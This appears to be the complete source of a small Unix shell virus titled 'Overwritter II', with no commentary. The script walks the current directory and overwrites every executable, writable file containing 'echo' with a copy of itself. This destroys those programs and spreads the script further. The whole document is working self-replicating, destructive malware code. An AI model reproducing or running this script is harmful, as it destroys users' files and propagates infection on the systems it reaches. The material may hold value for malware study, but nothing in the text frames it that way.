  #Overwritter II
  for file in *
   do
    if test -f $file
    then
     if test -x $file
     then
      if test -w $file
      then
       if grep -s echo $file >.mmm
       then
       cp $0 $file
  fi; fi; fi; fi; fi
  done
  rm .mmm -f
